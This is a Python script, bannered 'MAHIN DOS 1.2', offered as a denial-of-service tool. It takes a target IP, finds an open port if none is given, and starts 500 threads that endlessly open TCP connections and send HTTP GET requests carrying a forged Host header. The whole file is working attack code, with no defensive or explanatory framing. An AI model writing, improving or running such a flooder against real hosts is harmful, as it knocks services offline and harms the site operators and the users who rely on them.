import socket
import threading
import os, sys
os.system('cls')
def portscanner(min,max):
	found_port = 0
	for i in range(min, max):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target, i))
			print(str(i) + 'is open')
			found_port = i
			break
		except:
			print(str(i) + 'is closed')
	return found_port

def attack():
	global attack_num
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target, port))
			s.sendto(("GET /" + target+'/Index.html' + " HTTP/1.1\r\n").encode('ascii'), (target, port))
			s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
			attack_num += 1
			print(outputp+str(attack_num)+'\n')
			s.close()
		except:
			pass
			#print(outputn +'\n')


ban = """


███    ███  █████  ██   ██ ██ ███    ██     ██████   ██████  ███████ 
████  ████ ██   ██ ██   ██ ██ ████   ██     ██   ██ ██    ██ ██      
██ ████ ██ ███████ ███████ ██ ██ ██  ██     ██   ██ ██    ██ ███████ 
██  ██  ██ ██   ██ ██   ██ ██ ██  ██ ██     ██   ██ ██    ██      ██ 
██      ██ ██   ██ ██   ██ ██ ██   ████     ██████   ██████  ███████ 1.2
                                                                     
                                                 

"""
print(ban)
#target = '192.168.0.104'
target=input('Enter Your Targeted Ip: ')
fake_ip = '188.21.20.32'
#port = 8000
prtscn = input('Do you have a specific port? y/n: ')
if prtscn == 'y':
	port=int(input('Enter port Number :'))
else:
	min = int(input('Minimum port value for search: '))
	max = int(input('Maximum port value for search: '))
	port = portscanner(min,max)
outputp= "[+] Data packet sent to "+target+'--'
outputn= "[-] Failed to send data packet  to "+target+''


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

attack_num = 0



